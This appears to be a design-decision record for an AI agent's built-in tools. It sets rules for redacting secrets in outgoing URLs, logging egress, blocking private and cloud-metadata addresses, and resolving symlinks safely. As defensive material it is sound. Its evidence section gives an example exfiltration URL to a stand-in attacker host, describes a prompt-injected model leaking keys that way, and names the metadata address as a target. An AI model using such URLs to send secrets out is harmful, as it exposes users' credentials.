# Delta — what the built-in tools do at their edges

| Field | Value |
|---|---|
| **Status** | `PROPOSED 2026-09-27 — pending the Tech Lead's ratification. T-F1-09 implements it and is merged with it open, at the user's instruction to carry on through T-F1-10.` |
| **Date** | 2026-09-27 |
| **Task** | T-F1-09 |
| **Raised by** | Implementing T-F1-09 against Art. 4, Art. 5, REQ-AGT-018 and Tech §5.3 |

## Evidence

1. **Art. 4:** "Every request that leaves the machine SHALL go through secret redaction and
   SHALL be recorded in `egress_log`." `fetch_url` sends requests that leave the machine, but
   REQ-SEC-002 and `egress_log` speak only of providers, and REQ-AGT-018 says nothing about
   either. A URL is also the easiest way for a prompt-injected model to exfiltrate a secret
   (`https://evil.example/?k=<key>`).
2. **REQ-AGT-018** refuses *redirects* whose target resolves to a private range. It is silent on
   the first request, although `http://169.254.169.254/` needs no redirect at all.
3. **AGENTS.md:** "never run WriteFS/Exec/Network tools outside `security.Decide()`" is a rule
   for people; nothing in the specs says where it is enforced.
4. **Tech §5.3:** "Resolving symlinks is the caller's (the tool, T-F1-09)", with no rule for a
   path that does not exist yet, or for a write root reached through a link (macOS's `/tmp`).
5. **No spec bounds a tool's output**, while a model's context is finite and `grep` over a large
   tree is unbounded.

## Decisions

1. **`fetch_url` is egress under Art. 4.** A URL that the redaction rules would change carries a
   secret and is refused before anything is sent, as written or with its percent-encoding
   undone, and so is a URL whose encoding cannot be undone, since the rules could not read it;
   an encoding the rules cannot see through (base64) still passes, so this closes the
   easy channel, not every one. Every request, each redirect hop included,
   is recorded in `egress_log` before it is sent, with the thread, `provider = 'fetch_url'`,
   the host, and as payload the request URL (its length and SHA-256), since a GET carries
   nothing else. A row that cannot be written stops the request, as for model calls (DD-008),
   and without a log or the rules the tool sends nothing.
2. **`fetch_url` connects to no private address, redirected or not.** The check runs at dial
   time on the resolved address, so neither a redirect nor a name that resolves to one gets
   through: loopback, RFC 1918 and `fc00::/7`, link-local (the cloud metadata address
   included), `100.64.0.0/10`, `0.0.0.0/8`, `198.18.0.0/15`, `240.0.0.0/4` with the broadcast
   address, unspecified and multicast; IPv4-mapped IPv6 and NAT64 (`64:ff9b::/96`) judged by
   their IPv4 address, the deprecated IPv4-compatible form (`::/96`) refused. The host's own
   public addresses are not refused. No proxy is used, since a proxy would hide the address. At most five
   redirects, each `http` or `https`. A body that is not text is described, not returned.
3. **The registry runs a call only under the grant decided on its own action.** A grant carries
   the action it was decided on; `Invoke` computes the call's action again — its target resolved
   again — and refuses the call unless it is that one and the decision is an `allow` or an
   approved `ask`. A grant cannot be carried to another call, and a target that moved while the
   user read the approval (a symlink swapped in) is refused. The risk decided on is the one the
   tool registered with, whatever its `Action` reports. A call whose working directory or write
   root is not absolute is refused before it is decided on. The limit: a tool's `Run` is a Go
   method, so code in the daemon could call it without the registry; the composition root wires
   only the registry into the agent runtime (T-F1-13).
4. **Targets are resolved through symlinks** before the policy sees them: through the nearest
   existing ancestor for a path that does not exist yet, and the cwd and the write root the
   same way. A link inside the root that points out of it yields a target out of it. **A write
   goes to that resolved target**: a path that is a link writes the file it points to, which is
   what the policy decided on and the diff shows, and the link stays. The registry hands the
   tool the target it checked the grant against, and the write goes there without resolving
   anything again: it runs in an `os.Root` opened on that target's nearest existing directory,
   fails if a component or the target itself has become a link since the check, and goes
   through a temporary file renamed over the target. A dangling link resolves to its own path,
   so the policy may allow it; the write then refuses it, at run time rather than at approval.
5. **Input and output are bounded:** the file tools read only regular files of at most 16 MiB,
   opened without blocking, so a device (`/dev/zero`), a FIFO or a huge file can neither exhaust
   the daemon's memory nor hang the call; `read_file` returns at most 256 KiB (and says where it stopped),
   `grep` at most 500 matches of at most 300 characters each, reading at most 4 MiB of a file
   and saying where it stopped when a line is too long, `glob` and `list_dir` at most
   1000 entries; searches skip `.git`, binary files and files over 4 MiB.

## Impact

- Data Model §2.12: `egress_log.provider` holds a provider id or the tool `fetch_url`. No DDL
  change: the column is free text.
- Tech §5.3b (new) states decisions 1–5.
- REQ-AGT-018 could gain "and to such ranges directly", and REQ-SEC-002 "or a tool", if the
  Tech Lead wants the PRD to say it outright.
